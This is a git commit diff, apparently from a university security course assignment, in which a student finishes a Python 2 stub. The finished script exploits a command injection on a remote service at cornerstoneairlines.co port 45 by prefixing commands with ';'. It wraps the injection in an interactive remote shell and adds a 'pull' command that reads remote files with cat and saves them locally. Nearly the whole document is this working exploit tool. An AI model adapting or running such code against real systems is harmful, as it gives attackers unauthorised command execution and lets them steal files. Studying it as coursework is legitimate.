071ab5e8e636ace80955bce2a84714497b1e8a49
Bryan Soriano <itsbryan@terpmail.umd.edu>
2018-09-27 21:32:23 -0400

    fin stub.py

--- week/4/stub.py
+++ week/4/stub.py
@@ -8,33 +8,59 @@
 """
 
 import socket
-import os
-import re
 
 host = "cornerstoneairlines.co" # IP address here
 port = 45 # Port here
 
+# opens connection and issues command, expects command to start with ";"
 def execute_cmd(cmd):
-    """
-        Sockets: https://docs.python.org/2/library/socket.html
-        How to use the socket s:
+    # Establish socket connection
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+    data = s.recv(1024)     # Receives 1024 bytes from IP/Port
+    s.send(cmd + "\n")
+    data = s.recv(1024)
+    return data
 
-            # Establish socket connection
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((host, port))
+# shell logic
+def shell():
+    path = "/"
+    while(True):
+        cmd = raw_input(path.strip() + "> ")
+        if (cmd == "exit"):
+            break
+        elif (cmd.startswith("cd")):
+            pwd = execute_cmd(";cd " + path + ";" + cmd + ";pwd").strip()
+            if (pwd != ""):
+                path = pwd
+        else:
+            print(execute_cmd(";cd " + path + ";" + cmd).strip())
 
-            Reading:
+# reads in remote file using cat command and then writes it to the local path
+def pull(remote, local):
+    file = execute_cmd(";cat " + remote)
+    open(local, "w+").write(file)
 
-                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
-                print(data)             # Prints data
-
-            Sending:
-
-                s.send("something to send\n")   # Send a newline \n at the end of your command
-    """
-    print("IMPLEMENT ME")
-
+# prints commands that are available
+def help():
+    print(
+        """1) shell: Drop into an interactive shell and allow users to gracefully `exit`
+        2) pull <remote-path> <local-path>: Download files
+        3) help: Shows this help menu
+        4) quit: Quit the shell""")
 
 if __name__ == '__main__':
-    cmd = input()
-    print cmd
+    while(True):
+        cmd = raw_input("> ")
+        if (cmd == "shell"):
+            shell()
+        elif (cmd.startswith("pull")):
+            args = cmd.split()
+            if (len(args) == 3):
+                pull(args[1], args[2])
+            else:
+                print("Pull takes two arguments")
+        elif (cmd == "quit"):
+            break
+        else:
+            help()
